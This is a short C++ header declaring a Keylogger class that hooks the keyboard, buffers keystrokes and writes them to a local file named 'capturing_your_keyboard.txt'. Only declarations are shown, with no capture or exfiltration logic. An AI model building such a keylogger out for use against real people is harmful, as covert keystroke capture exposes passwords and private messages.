#pragma once
#include "Hook.h"

#include <fstream>
#include <vector>

using namespace std;

class Keylogger {
public:
	void start();
	void stop();
	~Keylogger();
private:
	const int BUFFER_SIZE = 10;
	const wstring FILENAME = L"capturing_your_keyboard.txt";
	Keylogger* keylogger;
	Hook* hook;
	wofstream logFile;
	vector<wchar_t>* textBuffer;

	void keyboardHandler(wchar_t* key);
	void writeToFile();
};

